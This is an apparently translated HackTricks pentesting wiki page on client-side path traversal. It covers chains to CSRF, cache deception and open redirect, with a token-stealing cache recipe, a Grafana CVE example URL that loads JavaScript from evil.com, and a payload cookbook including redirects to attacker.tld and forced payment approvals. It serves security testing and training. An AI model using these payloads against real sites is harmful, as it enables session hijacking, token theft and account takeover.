# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

Client side path traversal відбувається, коли ви можете **маніпулювати шляхом URL**, який буде **відправлений користувачеві для відвідування легітимно** або коли користувач якимось чином буде **примушений відвідати його, наприклад через JS або CSS**. CSPT також відомий як **On-Site Request Forgery (OSRF)**, оскільки дозволяє змусити браузер жертви звертатися до будь-яких шляхів на тому ж origin з їхніми cookies, JWTs або mTLS сертифікатами.

Типові джерела (дані, які ви контролюєте):

- Параметри маршруту, які конкатенуються в `fetch()` або XHR шляхи (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Збережені значення (profile slugs, document IDs), які інтерполюються в шляхи всередині background jobs, service workers або WebSocket URLів.
- UI-елементи (кнопки download/export, image galleries), які додають керовані користувачем фрагменти або file extensions до API endpoint-ів перед відправленням запиту.

Типові sinks (куди приземляється traversal):

- Frontend API wrappers, які додають префікс `/api/` або `/proxy/` і автоматично використовують заголовки автентифікації.
- `history.pushState` / `router.navigate` хелпери, які реконструюють URL пізніше під час hydration.
- `<link>`/`<style>`/`@import` директиви, згенеровані CMS-контентом або payload-ами feature-flag.

### Загальні наслідки та ланцюжки

- **CSPT ➜ CSRF/OSRF**: перехоплення автентифікованих `POST/PUT/DELETE` викликів шляхом відхилення від запланованого ресурсу, а потім повторного переходу до чутливих endpoint-ів (password reset, payment approval, access revocation). Поєднуйте з чеклістом для [CSRF](csrf-cross-site-request-forgery.md) для ескалації.
- **CSPT ➜ cache deception / poisoning**: доставка attacker-controlled JSON через public CDN ключі та відтворення його без автентифікації. Див. [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal потрапляє на open redirect endpoint, який далі переадресовує на інфраструктуру attacker-а, що подає шкідливий JS або SSRF payload-и. Поєднуйте з абузами [Open Redirect](open-redirect.md).

### Приклади знаходжень

- У [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/) було можливо **змінити invite URL** так, що в результаті він **скасував картку**.
- У [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html) вдалося поєднати **client side path traversal via CSS** (були зміни шляху, звідки підвантажувався CSS ресурс) з **open redirect**, щоб завантажити CSS з **attacker controlled domain**.
- У [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html) показана техніка, як зловживати CSPT **для виконання CSRF-атаки**. Це досягається шляхом **моніторингу всіх даних**, які може контролювати атакуючий (URL path, parameters, fragment, дані, інжектовані в DB...) **та sinks**, куди ці дані потрапляють (виконувані запити).
- Перевірте [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) для моніторингу.
- Спробуйте [**this CSPT playground**](https://github.com/doyensec/CSPTPlayground) для вправ.
- Перегляньте [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) про те, як використовувати розширення в playground.

## CSPT-assisted web cache poisoning/deception

CSPT можна поєднати з extension-based CDN caching для ексфільтрації чутливого JSON, який вилучається автентифікованими API викликами:

- Frontend конкатенує керований користувачем ввід у API шлях і додає заголовки автентифікації в fetch/XHR.
- Інжектуючи dot-segments (../) ви можете перенаправити автентифікований запит на інший endpoint на тому ж origin.
- Якщо цей endpoint (або варіант шляху зі static-looking suffix, наприклад .css) кешується CDN без варіації по auth headers, відповідь автентифікованого користувача може бути збережена під публічним cache key і отримана будь-ким.

Короткий рецепт:

1) Знайдіть SPA-код, який будує API URLs з параметрів шляху і відправляє auth headers.
2) Визначте чутливі endpoint-и та протестуйте static suffixes (.css, .js, .jpg, .json), щоб перевірити, чи CDN змінює заголовки на Cache-Control: public/max-age і X-Cache: Hit під час повернення JSON.
3) Заманіть жертву на URL, який інжектує traversal в SPA parameter так, щоб автентифікований fetch потрапив у cacheable path variant (наприклад, ../../../v1/token.css).
4) Зчитайте той самий URL анонімно, щоб отримати кешований секрет (token → ATO).

Деталі та пом'якшення див. на сторінці Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Hunting workflow & tooling

### Пасивне виявлення за допомогою intercepting proxies

- **Автоматично корелюйте джерела/синки**: [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) парсить вашу proxy history, кластеризує параметри, які пізніше відображаються всередині інших request’ів шляхів, і може повторно генерувати proof-of-concept URLs з canary tokens для підтвердження експлуатованих traversals. Після завантаження JAR встановіть `Source Scope` на client parameters (наприклад, `id`, `slug`) і `Sink Methods` на `GET, POST, DELETE`, щоб розширення підсвітило небезпечні request builders. Ви можете експортувати всі підозрілі джерела з вбудованим canary для масової валідації.
- **Шукайте double-URL-decoding**: під час перегляду з Burp або ZAP слідкуйте за шаблонами `/api/%252e%252e/`, які нормалізуються фронтендом перед відправленням у мережу — вони зазвичай з'являються як base64-encoded JSON bodies, що посилаються на route state, і легко пропускаються без автоматизованого сканера.

### Інструментування SPA sinks вручну

Вставка короткого snippet у DevTools допомагає виявити приховані traversals під час взаємодії з UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Додайте подібні обгортки навколо `XMLHttpRequest.prototype.open`, `history.pushState`, та специфічних для фреймворків роутерів (наприклад, `next/router`). Спостереження за `init.credentials === "include"` швидко звужує коло запитів, які несуть session cookies.
- Якщо додаток зберігає підказки маршрутизації в IndexedDB/localStorage, відредагуйте ті записи з traversal payloads і перезавантажте — мутований стан часто повторно інжектиться в запити перед pre-hydration.

### Лабораторія та відпрацювання payload

- Запустіть CSPT Playground через `docker compose up` і попрактикуйтесь у ланцюжках traversal ➜ CSRF ➜ stored XSS без взаємодії з ціллю. Відтворення структури роутера цілі локально полегшує створення shareable PoCs.
- Тримайте scratchpad успішних dot-segment variations (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) та suffix tricks (`.css`, `.json`, `;` matrix params), які ви спостерігали під час recon, щоб швидко їх відтворювати при появі нового sink.

## Останні кейси (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Traversal gadget всередині `/public/plugins/` дозволяв атакувальникам пронести `../../` у plugin asset loader, поєднати це з Grafana’s open redirect і змусити жертв завантажити attacker-controlled plugin bundles. Коли anonymous dashboards були увімкнені, скомпонований URL, наприклад `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js`, приводив до виконання в браузері remote JavaScript; якщо був встановлений Image Renderer plugin, та сама примітива могла перетворитися на SSRF, перенаправивши запити рендерингу до internal hosts. Завжди тестуйте plugin asset paths, anonymous dashboards та renderer endpoints разом, бо один traversal часто дає як XSS, так і SSRF вектори.

## Payload cookbook

| Мета | Шаблон payload | Примітки |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Працює коли роутери просто конкатенують `/${doc}`. Додайте `.json`, якщо CDN кешує лише статично-виглядні ресурси. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Комбінуйте з trusted redirectors, переліченими в кодовій базі цілі. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN може трактувати `.css` як статичний ресурс і кешувати секрети, повернуті як JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Деякі роутери приймають `_method` overrides; поєднуйте з traversal, щоб перенаправити запити на destructive endpoints. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
